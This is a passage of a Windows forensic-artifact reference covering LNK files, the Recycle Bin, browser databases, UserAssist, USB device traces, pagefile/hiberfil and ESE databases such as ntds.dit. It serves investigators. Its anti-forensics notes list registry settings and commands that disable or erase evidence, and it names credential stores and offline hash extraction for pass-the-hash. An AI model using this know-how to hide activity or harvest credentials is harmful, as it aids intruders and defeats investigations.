- Target's NetBIOS name, MAC address (when target is on a network share — recorded as `MachineID` and `Mac` fields in tracker data).
- Target's MACB timestamps **at time of LNK creation/update** — embedded in the LNK header. These are SI timestamps of the target as the shell saw it.
- Target file size.
- Working directory, command-line arguments, icon location, hotkey.
- A `Distributed Link Tracker` ("DLT") block containing the volume's NTFS object ID and the file's NTFS object ID — used by the Link Tracker service for "follow-the-file" behavior. **The object ID is essentially a system-wide unique fingerprint.**

Automatic jump lists are OLE Compound Document Format ("OLECF") files containing multiple sub-streams: a `DestList` stream listing entries with timestamps and counts, plus per-entry LNK streams.

Custom jump lists are sequences of LNK structures concatenated.

**Format / encoding:**

- LNK: documented in [MS-SHLLINK] (Microsoft Open Specifications). Header (76 bytes) + flags + LinkTargetIDList + LinkInfo + StringData + ExtraData blocks (TrackerDataBlock, EnvironmentVariableDataBlock, ConsoleDataBlock, etc.).
- AutomaticDestinations: OLE CF container; DestList stream uses a versioned format. Each DestList entry has: entry ID, hash, modified time, pinned flag, last-access time, file size, target path.
- CustomDestinations: a stream of LNKs.

**Retention:**

- Automatic recent LNKs: typically 20 entries before oldest is dropped, but the LNK files on disk often outlive the registry MRU (`HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs` MRU list).
- Jump lists: typically last 10-20 entries per app, configurable in taskbar settings.

**Parsers (by name only):**
- Eric Zimmerman's `LECmd` (LNK parser) and `JLECmd` (jump list parser).
- TZWorks `lp` (LNK) and `jmp` (jump list).
- `liblnk` (Joachim Metz).
- `python-lnk-parser`.
- AnalyzeMFT does NOT parse LNKs; AnalyzePf does NOT either.
- log2timeline / plaso.

**Canonical forensic insight:**

LNK files are **proof of access**. Whenever a user (or a program acting as the user) opens a file via Explorer, the common Open dialog, or any shell-aware path, Windows writes a LNK file in `Recent`. The LNK preserves:

- The **target's full path** (even after the target is deleted or moved).
- The **target's volume serial** — proving access to a specific USB or network volume.
- The **target's MAC timestamps at time of access**, even if the target's current timestamps have been tampered.
- The **target's file size at access time**, for size-comparison.
- The **NetBIOS name + MAC address** of the source machine if the target was on a remote share — surviving evidence of "this file was accessed on host X."
- The **NTFS object ID** of both volume and file — globally unique link tracking.

Jump lists extend this to per-application MRU: which 30 PDFs did Acrobat open, which 20 SQL files SSMS opened, which 50 documents Word touched.

**Gotchas:**

- **LNKs can be created by code other than user actions.** Office, browsers, MRU updaters. Not 100% "user did this."
- **A LNK in `Recent`** doesn't prove the user opened the target — it proves a shell-aware code path did.
- **MAC address inside LNK** is the host that CREATED the LNK, not the host the target is on. Common confusion.
- **Volume serial number is 32-bit** and can collide; combine with volume label for confidence.
- **Embedded timestamps are at LNK creation/update time**, not necessarily target-open time.
- **LNK signatures are reliable** (header magic `4C 00 00 00 01 14 02 00 00 00 00 00 C0 00 00 00 00 00 00 46`).
- **AutomaticDestinations AppID** is an FNV-1a hash of the application path — mapping back to apps requires a known-AppID list (community-maintained).
- **DestList timestamps** are FILETIME but apply to LNK entry, not necessarily target.
- **Pinned items vs. recent items** in jump lists are distinguished by a flag in DestList.
- **Resilience**: LNKs survive target deletion, target rename, and external-volume detachment.

**Anti-forensics interactions:**

- **Clearing `Recent`** — files deletable; $MFT/$UsnJrnl preserves traces.
- **Disabling recent items** via `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRecentDocsHistory=1` — stops future LNK creation. Existing LNKs remain.
- **Editing LNK to point elsewhere** — possible but obvious if timestamps don't match.
- **Using non-shell paths** — direct `cmd.exe file.exe` does not create a LNK.
- **Tools that "clean tracks"** typically miss CustomDestinations and Office Recent.

**Cross-corroboration partners:**

- **$MFT** on the target — confirms target existed when LNK said it did.
- **ShellBags** — folder containing the target.
- **JumpList per-app** — corroborates Office / browser / IDE opens.
- **RecentDocs / OfficeMRU registry** — parallel MRU.
- **USBSTOR / MountedDevices** — volume serial in LNK ↔ USB device.
- **Prefetch / Amcache** — if the target was executable, confirms execution.

---

## 25. Recycle Bin ($I/$R)

**Full name:** Windows Recycle Bin. Per-user, per-volume staging area for deleted files. Pre-Vista format was `INFO2` (binary); Vista+ uses paired `$I<RandomString>` (metadata) and `$R<RandomString>` (file body) files.

**Path / location:**
- Per-user, per-volume: `<volume>:\$Recycle.Bin\<SID>\` (e.g., `C:\$Recycle.Bin\S-1-5-21-...-1001\`).
- Hidden, system-protected directory.
- Empty bin: no files inside the SID directory.
- Pre-Vista (XP / 2003): `C:\RECYCLER\<SID>\INFO2` (single index) + per-file `DC<index>.<ext>`.

**What they record:**

Each deletion produces two files:
- **`$I<RandomString>`** — metadata file. Contains:
  - Version (8 bytes; 1 for pre-Win10, 2 for Win10+ which adds variable-length original path).
  - Original file size (8 bytes).
  - Deletion timestamp (FILETIME, 8 bytes).
  - Original full path (UTF-16LE).
- **`$R<RandomString>`** — the file contents. Same name suffix as the $I.

The `<RandomString>` is a 6-character base32-like string, NOT a sequential counter.

**Format / encoding:**

`$I` files are binary, fixed header + variable path. `$R` files are the original file body, byte-for-byte.

**Retention:**

Files remain in the Recycle Bin until:
- User empties Bin (manually or auto-empty via Storage Sense).
- User restores the file.
- Bin exceeds configured size limit (per-volume; oldest dropped first).
- Volume is reformatted.

When emptied, the $I and $R are themselves deleted — leaving $MFT residue and possibly file-content carving opportunities.

**Parsers (by name only):**
- Eric Zimmerman's `RBCmd`.
- TZWorks `rb` (legacy + Vista+).
- KAPE Recycle Bin target.
- Direct hex / Python script — format is trivial.
- log2timeline / plaso.

**Canonical forensic insight:**

The Recycle Bin is the **deleted-file recovery target of choice** because the files are intact — not just MFT records. For files the user actively deleted via Explorer (Delete key, drag-to-Bin), the original is sitting in `$R`. For each, the `$I` gives:

- The original path (proves where the file came from — useful when investigating "data theft" claims).
- The original filename (which the shell hides — `$R` only has random name).
- The deletion timestamp — to-the-second user action time.
- The original size — for hash-by-size matching.

**Gotchas:**

- **Shift+Delete does NOT use the Recycle Bin.** Skip-bin delete leaves no Recycle Bin trace.
- **`del` from cmd.exe** does NOT use Recycle Bin. Same for `Remove-Item`.
- **Per-user SID subdirectory.** Many users → many SIDs → check all.
- **System SID (S-1-5-18) subdirectory** rarely populated; SYSTEM doesn't delete via shell.
- **Random `<string>` mapping** — pair $I and $R by matching the 6-char suffix.
- **Pre-Win10 `$I` format** lacks the original path length field; older parsers may stumble on newer versions.
- **Network share Recycle Bin** can exist on the share itself; many shares have it disabled.
- **External drives have their own `$Recycle.Bin`** per volume — pulling a USB before checking misses its bin.
- **Auto-empty (Storage Sense)** clears bin entries by age (default 30 days). After auto-empty, only $MFT residue.
- **Application "delete" mechanisms** vary — some apps move-to-trash, some unlink directly.

**Anti-forensics interactions:**

- **Direct `Remove-Item` / `del`** — no Bin entry.
- **Empty Bin** — `Clear-RecycleBin` or shell action. $I and $R deleted; recovery from $MFT + cluster carving.
- **Per-volume Bin disable** via Recycle Bin properties — files deleted via Explorer skip Bin.
- **Modifying $I metadata** — possible (just a binary file), but $R content is unmodified.
- **Filling Bin to force rotation** — push out older incriminating $I/$R pairs.

**Cross-corroboration partners:**

- **$MFT** — both the $I/$R entries and the original (now-deleted) file record. Deletion of $R produces $UsnJrnl entries.
- **$UsnJrnl** — REASON_FILE_DELETE entries for original files, REASON_FILE_CREATE for $I/$R.
- **ShellBags** — parent folder of the originally-deleted file.
- **LNK files in Recent** — may reference the original file pre-deletion.
- **VSS** — older Bin states may persist in shadows.

---

## 26. Browser Artifacts (Chrome, Edge, Firefox)

**Full name:** The set of databases, files, and caches that browsers maintain. Common to Chrome (Chromium), Edge (Chromium), and Firefox (Gecko). Brave, Vivaldi, Opera and other Chromium-based browsers follow the Chrome layout. Internet Explorer / legacy Edge (EdgeHTML) used ESE (covered in §30 — WebCacheV01.dat).

**Path / location:**

**Chromium-based (Chrome, Edge Chromium, Brave):**
- Profile root: `%LocalAppData%\Google\Chrome\User Data\Default\` for Chrome; `%LocalAppData%\Microsoft\Edge\User Data\Default\` for Edge.
- Multiple profiles: `Default`, `Profile 1`, `Profile 2`, ...
- SQLite databases inside profile:
  - `History` — visits, downloads, segments, keyword_search_terms.
  - `Cookies` — cookie store (encrypted values).
  - `Login Data` — saved passwords (encrypted via DPAPI).
  - `Web Data` — autofill profiles, credit cards, form data.
  - `Bookmarks` — JSON file (not SQLite).
  - `Top Sites` — frequent visits.
  - `Favicons` — favicon cache.
  - `Network\Cookies` — newer cookie location.
  - `Shortcuts` — typed shortcut history.
  - `Visited Links` — bloom filter of visited URLs.
- Cache: `Cache\` (HTTP cache; binary, indexed by hash).
- Extensions: `Extensions\<ID>\` with manifest.json and resources.
- Session restore: `Current Session`, `Last Session`, `Current Tabs`, `Last Tabs` — binary SNSS format.
- Preferences: `Preferences` JSON.

**Firefox:**
- Profile root: `%AppData%\Mozilla\Firefox\Profiles\<random>.default-release\`.
- `places.sqlite` — history + bookmarks (consolidated).
- `cookies.sqlite` — cookies.
- `formhistory.sqlite` — autofill.
- `key4.db` + `logins.json` — saved credentials.
- `downloads.sqlite` (older) / `places.sqlite moz_annos` (newer) — downloads.
- `sessionstore.jsonlz4` — restorable session.
- `cache2\` — HTTP cache.

**Legacy Edge (EdgeHTML) / Internet Explorer:**
- `WebCacheV01.dat` (ESE, see §30).

**What they record:**

History:
- Every URL visited (visit time, visit count, visit duration, transition type — link click, typed, reload, form submit, etc., redirect chain, referrer).
- Per-visit: `visit_id`, `url_id`, `visit_time` (Chrome uses microseconds since 1601 in History; Firefox uses microseconds since UNIX epoch).
- Search terms extracted from URLs of known search engines (`keyword_search_terms`).

Downloads:
- Source URL, referrer, target path, MIME type, total bytes, received bytes, state (in progress / complete / cancelled / failed), interrupt reason, end time, opened flag, danger type (safe / dangerous file / dangerous URL / etc.), tab URL, tab referrer.

Cookies:
- Domain, path, name, value (encrypted via DPAPI + AES-GCM in modern Chrome; key wrapped in `Local State`), expiry, secure/httpOnly/sameSite flags, creation time, last access.

Saved logins:
- URL, username (cleartext), password (DPAPI-encrypted to user's profile).

Cache:
- HTTP responses (headers + body), keyed by URL hash.

Session restore:
- Tab tree at last shutdown — opens transitions, navigated URLs per tab.

**Format / encoding:**
- SQLite (Chrome / Firefox).
- JSON (Bookmarks, Preferences).
- SNSS binary (Chromium session).
- LZ4-compressed JSON (Firefox session).
- DPAPI-wrapped AEAD (passwords, cookie values).

**Retention:**

Default Chrome / Edge: history kept ~90 days (configurable). Cookies: per-cookie expiry. Cache: LRU-evicted by size. Downloads: until user clears. Firefox: 60-180 days default for history.

Private / Incognito browsing: nothing persists. But DNS cache, $MFT (cache file writes), Sysmon 3 (network connections), and memory all retain evidence.

**Parsers (by name only):**
- `Hindsight` (Ryan Benson) — gold-standard Chromium browser parser.
- `BrowsingHistoryView` (Nirsoft) — multi-browser GUI.
- `MozillaHistoryView`, `MozillaCookiesView` (Nirsoft) — Firefox.
- `sqlitebrowser` / `DB Browser for SQLite` — generic.
- log2timeline / plaso `chrome_history`, `firefox_history`, etc.
- Eric Zimmerman's `KAPE` has targets, not dedicated parsers.
- `chromagnon` (Ryan Benson, older), `ChromeCacheView` (Nirsoft).
- Browser-Decode tools for password recovery (DPAPI-required).

**Canonical forensic insight:**

Browser history is **the user's intent record**. URL visits with transition types reveal: did the user type the URL (intentional), click a link (chained from somewhere), or get redirected (possibly drive-by)? Downloads with source URL prove what was pulled from where, and to which on-disk target — the start of a "what did the attacker drop" trace.

Cookies and saved logins are credential-theft material. Browser caches hold copies of pages and resources — invaluable when servers are gone but the cached page still exists.

Session restore catches the tab tree the user had open at compromise time — sometimes including webmail with the attacker's recovery email visible.

**Gotchas:**

- **SQLite WAL files (`History-journal`, `History-wal`)** — must be replayed for current state. Parsers that ignore WAL miss recent activity.
- **Locked database** when browser is running — copy first, then parse.
- **Time zones**: Chrome uses UTC-ish microseconds-since-1601; Firefox uses UTC microseconds-since-1970. Conversion required for human dates.
- **Transition type bitfield** — only the low 8 bits are the type; the high bits are qualifiers. Easy to misinterpret.
- **Incognito** doesn't write to History DB but writes to OS-level caches (DNS, Sysmon).
- **Multiple profiles** — each profile is a separate SQLite. Default profile is `Default`; others under `Profile 1` etc.
- **Synced data** — Chrome Sync pulls in URLs from other devices. A visit may have happened on another device.
- **DPAPI passwords**: cracking offline requires the user's NTLM hash or login password.
- **Extensions can write to any SQLite** — extension-injected data may appear as user history.
- **HSTS preload list** vs. user data — preload doesn't reflect visits.
- **CRX downloads** for Chrome extensions are in `Extensions\<ID>` — confirms what extensions were installed.
- **`History Provider Cache`** holds search bar autocomplete sources.

**Anti-forensics interactions:**

- **Clearing browsing data** via Settings — deletes from SQLite but leaves $MFT / $UsnJrnl / VSS evidence.
- **Manual SQLite editing** — possible but doesn't update indexes consistently; corrupted DBs are themselves evidence.
- **Incognito mode** — DB unaffected, but cache, DNS, network logs still capture.
- **Browser uninstall** — removes profile directory; VSS shadows may preserve.
- **Privacy tools** (CCleaner, BleachBit) — wipe browser data; leave their own logs.
- **Self-destructing cookies** — extensions that clear cookies on tab close; cookies DB shows nothing but visits remain in history.

**Cross-corroboration partners:**

- **Sysmon 22** — DNS queries match visited domains.
- **Sysmon 3** — outbound connections to resolved IPs.
- **$MFT** for download targets — file creation matching download end time.
- **Defender** — if downloaded file was scanned.
- **Recycle Bin** for downloaded files later deleted.
- **DNS Client log** (`Microsoft-Windows-DNS-Client/Operational`) — corroborates.

---

## 27. MUICache + UserAssist

**Full name:**
- **MUICache** — Multilingual User Interface Cache. Stores the localized name (FriendlyName) of every program that ran in this user's session via the shell, used by Explorer to display in title bars and lists.
- **UserAssist** — A registry tracker that records every program launched via the Explorer shell (double-click, Start menu, taskbar), including count and last-execution time.

**Path / location:**

MUICache:
- `HKCU\Software\Microsoft\Windows\ShellNoRoam\MUICache` (Win XP)
- `HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache` (Vista+) — backed by UsrClass.dat.

UserAssist:
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{GUID}\Count`
  - GUIDs of interest (Win10+):
    - `{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}` — executables.
    - `{F4E57C4B-2036-45F0-A9AB-443BCFE33D9F}` — shortcut targets.
    - `{F2A1CB5A-E3CC-4A2E-AF9D-505A7009D442}` — App Launch (Win10+).
    - `{B267E3AD-A825-4A09-82B9-EEC22AA3B847}` — App Switch.
    - Older `{75048700-...}` and `{5E6AB780-...}` — XP era.

**What they record:**

MUICache: For each program executed via Shell, an entry mapping the executable path to its FriendlyAppName (from the PE Version Info or installed app metadata). Sometimes also a value for the application's company name.

UserAssist: For each shell-launched program (and shortcut), a value whose NAME is ROT13-encoded path/identifier (a quirky obfuscation) and whose DATA is a 72-byte binary blob containing:
- Session ID.
- Run count.
- Focus count.
- Focus time (cumulative ms).
- Last execution time (FILETIME).

The ROT13 encoding is purely cosmetic; trivial to decode.

**Format / encoding:**

MUICache: `REG_SZ` values, path → friendly name.
UserAssist: `REG_BINARY` values, ROT13-encoded names, fixed-size struct contents.

**Retention:**

Both persist indefinitely until the user profile is wiped or the user explicitly clears. UserAssist grows monotonically; old entries persist forever absent intervention.

**Parsers (by name only):**
- RegRipper `userassist`, `muicache` plugins.
- Eric Zimmerman's `RECmd` (with UserAssist batch).
- TZWorks `cafae`.
- Direct ROT13 decode + binary struct parse.

**Canonical forensic insight:**

UserAssist is the **per-user execution counter** for shell-launched programs. It answers:
- Did this user run this program?
- How many times?
- When was the last execution?
- How long did the program have focus?

It is one of the strongest per-user execution artifacts on Windows — combined with Amcache/Prefetch (which give system-wide execution), UserAssist tells you "and this specific user did it."

MUICache is weaker but corroborates: any path appearing in MUICache was executed by the shell at some point — useful for execution evidence on programs without Prefetch.

**Gotchas:**

- **UserAssist tracks SHELL-launched only.** Command-line invocations (`cmd.exe foo.exe`), service-launched programs, scheduled tasks, programs spawned by other programs — none recorded.
- **ROT13 obfuscation** is named "encryption" in some docs — it isn't. Microsoft uses it to discourage casual snooping by users.
- **Focus time** can be misleading — closed but minimized windows count differently.
- **Last execution time** is FILETIME and accurate to ns.
- **GUIDs evolve** with Windows version; check all known GUIDs.
- **Session ID** in UserAssist data isn't the Terminal Services session — it's a UserAssist internal session counter.
- **MUICache friendly names** can be spoofed by attackers controlling the PE.
- **Clearing recent items** via Group Policy / settings does NOT clear UserAssist.
- **`Settings\Tracking` registry** — `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackProgs=0` disables future UserAssist updates.

**Anti-forensics interactions:**

- **Setting Start_TrackProgs=0** disables future writes; existing entries remain.
- **Manual registry edit** — delete entries individually. Leaves deleted-cell residue.
- **Running via command line / scheduled task** — no UserAssist entry. Common attacker pattern.
- **Replacing the value names** — possible since they're ROT13 strings; corrupts but doesn't remove fingerprint.

**Cross-corroboration partners:**

- **Amcache / Prefetch / ShimCache** — system-wide execution.
- **Security 4624** — which user session was active.
- **LNK / Jump List** — shortcut-launched programs corroborate with the {F4E57C4B...} GUID entries.
- **Sysmon 1 / Security 4688** — direct process creation.

---

## 28. MountedDevices + USBSTOR + USB Device Chain

**Full name:** The set of registry keys, event log entries, and setup logs that together identify every USB storage device ever attached to a Windows host — vendor, product, serial number, friendly name, drive letter at time of connection, and first/last/last-removal times.

**Path / location:**

Registry (SYSTEM hive, primarily):
- `HKLM\SYSTEM\MountedDevices` — maps drive letters and volume GUIDs to device instances. Values: `\DosDevices\C:`, `\??\Volume{GUID}`. Data: binary blob containing the device path or unique identifier.
- `HKLM\SYSTEM\CurrentControlSet\Enum\USBSTOR\Disk&Ven_<Vendor>&Prod_<Product>&Rev_<Revision>\<UniqueID>\` — one subkey per USB storage device ever attached. UniqueID is typically the device serial (or pseudo-serial if device doesn't expose one — second character `&` is the synthetic marker).
- `HKLM\SYSTEM\CurrentControlSet\Enum\USB\` — non-storage USB enumeration (keyboards, cameras, etc.).
- `HKLM\SYSTEM\CurrentControlSet\Enum\SCSI\Disk&Ven_*\` — when USBSTOR enumerates as SCSI.
- `HKLM\SYSTEM\CurrentControlSet\Control\DeviceClasses\{53F56307-B6BF-11D0-94F2-00A0C91EFB8B}\` (Disk class) and `{53F5630D-B6BF-11D0-94F2-00A0C91EFB8B}` (Volume class) — symbolic links keyed by device interface GUID.
- `HKLM\SYSTEM\CurrentControlSet\Control\Windows Portable Devices\Devices\` — PnP-X / WPD-aware devices (phones, cameras, modern USB drives) with FriendlyName.
- `HKLM\SYSTEM\CurrentControlSet\Enum\STORAGE\Volume\` — per-volume enumeration.
- `HKLM\SOFTWARE\Microsoft\Windows Portable Devices\Devices\` — friendly-name mapping.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\EMDMgmt\` — ReadyBoost candidates (also identifies devices).

Per-user (NTUSER.DAT):
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\MountPoints2\{GUID}\` — per-user mount events. Last-write time = when user attached. The single best "this user saw this device" timestamp.

Setup logs:
- `C:\Windows\inf\setupapi.dev.log` — PnP enumeration trace, includes first-connect timestamps for each device with friendly name, hardware ID, and instance ID. Plain text.

Event logs:
- `Microsoft-Windows-Partition/Diagnostic` — partition events (rich newer info).
- `Microsoft-Windows-Kernel-PnP/Configuration` — PnP events.
- `Microsoft-Windows-DriverFrameworks-UserMode/Operational` — UMDF driver events, includes some USB device events with timestamps.
- `System` log — USB hub events.

**What they record:**

For each USB storage device:
- Vendor / Product / Revision (USB descriptor strings).
- Serial number (or pseudo-serial).
- Volume GUID and drive letter at time of mount.
- Friendly name (sometimes including manufacturer-set string).
- First-seen timestamp (setupapi.dev.log entry).
- Last-mount timestamp (USBSTOR key last-write).
- Last-removal timestamp (registry MountPoints2 last-write).
- Per-user attach (NTUSER MountPoints2).

**Format / encoding:**

Registry binary blobs for MountedDevices; standard REG_SZ for USBSTOR strings; plain text for setupapi.dev.log.

**Retention:**

USBSTOR / Enum / MountedDevices: persistent until manually cleared. Devices attached years ago remain enumerated.

**Parsers (by name only):**
- RegRipper `usbstor`, `mountdev`, `mountpoints2`, `usbdevices` plugins.
- Eric Zimmerman's `RECmd` (USB batch).
- TZWorks `usp`.
- `setupapi.dev.log` is plain text; `grep`/`Select-String` directly.
- USBDeview (Nirsoft) — live system.

**Canonical forensic insight:**

The USB device chain is **the artifact for "what got plugged in and when."** For exfiltration cases (insider walks out with data on a USB), for data-introduction cases (malware came in on a USB), for "I never touched a USB stick" denials, the combined chain establishes:

- Device identity (serial number — usually unique per physical device).
- First-attach time.
- Last-attach time.
- Per-user attach evidence (NTUSER MountPoints2).
- Drive letter assignment (so file paths reference the right volume).

Combined with ShellBags (which record folder browsing on USB) and LNK files (which record files opened on USB and embed the volume serial), the USB story can be reconstructed even years later.

**Gotchas:**

- **Pseudo-serials** — devices without proper serials get one synthesized by Windows; second character of UniqueID is `&`. Not reliably unique across hosts.
- **MountPoints2 per-user GUIDs** can correlate to MountedDevices GUIDs to identify "which user saw which device."
- **Last-write on USBSTOR key** is the last MOUNT event, not the last access.
- **setupapi.dev.log rolls** when it grows large; older devices may have aged out.
- **Vendor / Product strings** can be empty or generic (`Generic USB Disk`).
- **USB hubs and pass-throughs** can complicate enumeration — the same drive may appear with different parent paths through different ports.
- **Non-storage USB** (HID, audio, webcam) lives under Enum\USB, not USBSTOR.
- **MTP / PTP devices** (phones, cameras) enumerate under WPD, not USBSTOR — entirely different key tree.
- **TrueCrypt / VeraCrypt-mounted volumes** appear as virtual disks; not USB enumeration.
- **Volume Serial Number** (32-bit, FAT/NTFS volume serial, NOT USB device serial) is a separate concept — often confused.

**Anti-forensics interactions:**

- **`USBSTOR` registry cleanup tools** exist and are used by privacy-conscious users.
- **Disabling USBSTOR driver** (`HKLM\SYSTEM\CurrentControlSet\Services\USBSTOR\Start=4`) blocks future mounts but doesn't remove history.
- **Editing setupapi.dev.log** is straightforward (plain text); tampering visible if file timestamps don't match content.
- **Live-CD / forensic write-blockers** to insert a USB without leaving traces — only works if user boots a non-Windows OS to handle the USB; on the suspect Windows install, evidence is created.
- **Hardware-level spoofing** (changing USB descriptors) — possible with custom firmware; defeats serial-based attribution.

**Cross-corroboration partners:**

- **ShellBags** — folder browsing on the USB volume.
- **LNK files** — files opened from USB embed volume serial.
- **Jump lists** — application-specific MRU of USB-resident files.
- **$MFT on the USB volume** (if the USB is available) — file-level activity.
- **Sysmon 9** (raw access read) — direct volume reads (potentially exfil tools).
- **DriverFrameworks-UserMode log** — UMDF events with USB attach timestamps.

---

## 29. Pagefile.sys / hiberfil.sys / swapfile.sys

**Full name:** Virtual memory backing store files. The OS-managed files where Windows pages memory contents to disk.

**Path / location:**
- `C:\pagefile.sys` — primary page file. Configurable location (one per volume permitted); default is C:\.
- `C:\hiberfil.sys` — hibernation file. Holds the compressed image of physical memory written when the system hibernates (S4) or fast-startup-shuts-down.
- `C:\swapfile.sys` — modern (Win8+) swap file for Universal Windows Platform apps and other modern app suspension.
- All three are hidden system files with strict ACLs; accessible only offline (forensic acquisition) or with elevated tools.

**What they record:**

**pagefile.sys:** Pages of process memory written to disk under memory pressure. Contents are whatever the page held at write time — code, data, strings, network buffers, decrypted credentials, browser DOM, etc. Pages are NOT structured for analysis; they are raw 4 KB blocks in an effectively random order. The page file does NOT have a directory or index. **It is a haystack of historical memory snippets.**

**hiberfil.sys:** A compressed dump of physical memory taken at hibernation time. Reversible into a usable memory image. Holds essentially everything in RAM at hibernation — running processes, kernel data, decrypted credentials, encryption keys, network state. Modern Win10+ uses Xpress-Huffman compression. Format: signature `HIBR` or `WAKE` (after wake), header pointing to compressed sets of pages.

**swapfile.sys:** Used to swap suspended Modern UI apps. Contents are Modern app memory.

**Format / encoding:**

- pagefile: raw 4 KB pages, no structure.
- hiberfil: Xpress-compressed page sets. Volatility's `imagecopy` plugin or `Hibr2Bin` (Comae / Crowdstrike) converts to a memory image.
- swapfile: similar to pagefile.

**Retention:**

- pagefile: contents continually overwritten as new pages page out. No retention guarantee. Pages stay until something else needs that slot.
- hiberfil: persists across reboots; replaced on next hibernation.
- swapfile: continuously updated.

**Parsers (by name only):**

For carving (pagefile):
- `bulk_extractor` (Simson Garfinkel) — extracts email addresses, URLs, IPs, credit card numbers, BitCoin addresses, PGP keys, etc.
- `strings` + grep — crude but effective.
- YARA over the raw file.

For hibernation:
- Volatility 3 (`windows.hiberbuf` or convert via `windows.dumpfiles`).
- Comae's `Hibr2Bin`.
- `hibr2dmp` (older).
- Memory analysis tools (Volatility, Rekall) once converted.

**Canonical forensic insight:**

Hiberfil is **a memory image you didn't expect to have.** When a Windows laptop hibernates (or fast-startup-shuts-down), the entire physical memory is written to hiberfil.sys. Hours or days later, that file still contains a snapshot of process memory at that moment — including decrypted credentials, Lsass contents, browser memory with cleartext sessions, network state.

Pagefile is **a strings goldmine for offline carving.** While not structured, it contains fragments of historical memory: SQL query strings, decrypted SSL bodies, credentials, command lines, document contents, registry data temporarily paged out. `bulk_extractor` over a pagefile yields IOC-rich extract.

**Gotchas:**

- **Page file may be disabled.** Some hardened systems (`pagefile=0`) have empty / nonexistent pagefile.
- **Page file location is configurable** — check `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PagingFiles`.
- **Hiberfil is often disabled** on desktops; required for fast startup. Check `HKLM\SYSTEM\CurrentControlSet\Control\Power\HibernateEnabled`.
- **Fast-Startup hibernation only saves SYSTEM session**, not user sessions — partial memory image.
- **Xpress compression varies** by Windows version; older hibr2bin may not handle newer formats.
- **BitLocker encryption** — these files are encrypted at rest on a BitLockered volume; requires unlock.
- **Page file size** can be enormous (16+ GB on workstations); take care with acquisition.
- **Pages are unordered**; you cannot reliably reconstruct contiguous process memory from pagefile alone.
- **TRIM / SSD GC** — SSDs may have aggressively trimmed deleted pages; older pagefile contents may be gone.
- **`ClearPageFileAtShutdown` policy** — when enabled, pagefile is zeroed on shutdown. Default off, but hardened systems enable it.

**Anti-forensics interactions:**

- **`ClearPageFileAtShutdown=1`** — zeroes pagefile on clean shutdown. Forensic value preserved if acquisition is via dirty pull.
- **Disabling hibernation** (`powercfg /h off`) — removes hiberfil.sys (zero-fills).
- **Encrypting the system volume** with BitLocker / VeraCrypt — files are encrypted on disk.
- **Anti-forensics tools** that overwrite pagefile slack — rare but exist.

**Cross-corroboration partners:**

- **Memory analysis (Volatility)** — when a hiberfil is converted, all memory-analysis artifacts become available: process list, network connections, lsass secrets, kernel modules, etc.
- **$MFT on pagefile/hiberfil** — confirms file presence and size.
- **Carved IOCs** — match against firewall logs / DNS logs / proxy logs.

---

## 30. ESE Databases (WebCacheV01.dat, SRUDB.dat, ntds.dit, Windows.edb)

**Full name:** Extensible Storage Engine (ESE / JET Blue) databases. Microsoft's embedded transactional database engine used in many Windows components.

**Path / location:**

- **WebCacheV01.dat**: `%LocalAppData%\Microsoft\Windows\WebCache\WebCacheV01.dat`. The Internet Explorer / legacy Edge web cache. Also stores DOMStore, cookies (legacy), download history, history. Per-user.
- **SRUDB.dat**: `C:\Windows\System32\sru\SRUDB.dat` (covered in §10).
- **ntds.dit**: `C:\Windows\NTDS\ntds.dit` on Domain Controllers. The Active Directory database — users, groups, OUs, schema, including the user's NTLM hashes (encrypted with the boot key from SYSTEM hive).
- **Windows.edb**: `%ProgramData%\Microsoft\Search\Data\Applications\Windows\Windows.edb`. The Windows Search index. Tokenized contents of indexed files plus property metadata.
- Sibling files for every ESE database:
  - `*.log` (transaction logs — `edb.log`, `edb00001.log`, etc.)
  - `*.jrs` (reserved transaction logs)
  - `*.chk` (checkpoint)
  - `*.tmp` (temp during transactions)

**What they record:**

**WebCacheV01.dat** contains the canonical IE/legacy-Edge history (the table `Container_*` per-container), cookies (`Container_2`/cookie storage on older versions), DOMStore, IndexedDB, download history. URL, visit count, last access, content (cache entries indexed by URL hash). Even when IE is uninstalled, WebCacheV01.dat may persist with rich history.

**ntds.dit** is the Active Directory database. Every user's distinguished name, SID, group memberships, attributes (mail, phone, etc.), and password hash. For offline AD compromise, exfiltrating ntds.dit + SYSTEM hive is the goal. Tools like Impacket's `secretsdump.py` parse offline.

**Windows.edb** holds tokenized contents of every indexed document — the Search index. For e-discovery and content-search investigations, the index can yield document fragments even when originals are deleted.

**Format / encoding:**

ESE / JET Blue. Pages of 4 KB or 8 KB (32 KB for SRUDB). Tables, indexes, BLOBs. Documented in [MS-ESE]; also Joachim Metz's `libesedb`.

A database may be in "dirty" state — transaction logs hold uncommitted operations. Tools must replay logs (`esentutl /mh`, `esentutl /r`) before stable parsing.

**Retention:**

Each ESE database has its own retention model. ntds.dit grows with the directory. Windows.edb is bounded by the index size cap. WebCacheV01.dat is per-container LRU.

**Parsers (by name only):**
- `esentutl.exe` — Microsoft's official utility for ESE recovery, repair, header inspection.
- `libesedb` / `esedbexport` (Joachim Metz) — convert ESE tables to CSV.
- `ESEDatabaseView` (Nirsoft) — GUI.
- `pyesedb` — Python bindings.
- Specific parsers:
  - WebCacheV01.dat: `BrowsingHistoryView` (Nirsoft), `IECacheView`.
  - ntds.dit: `ntdsxtract` (Csaba Barta), Impacket's `secretsdump.py`, `gosecretsdump`.
  - Windows.edb: `WinSearchDBAnalyzer` (Hideaki Ihara), libesedb.
  - SRUDB.dat: `srum-dump` (Mark Baggett, see §10).

**Canonical forensic insight:**

ESE is the **storage engine of the most boring high-value databases on Windows.** WebCacheV01.dat is the legacy-browser-history artifact (IE / Edge HTML) and remains on every Windows installation that has ever had legacy IE installed — which is essentially all of them. ntds.dit is the Active Directory crown jewel. Windows.edb is the e-discovery treasure trove. SRUDB.dat is exfil-sizing (§10).

For ntds.dit + SYSTEM, offline `secretsdump.py` produces every user's NTLM hash + Kerberos keys, enabling pass-the-hash and golden-ticket attacks. **Defense:** detect exfiltration patterns — VSS shadow → copy → exfil.

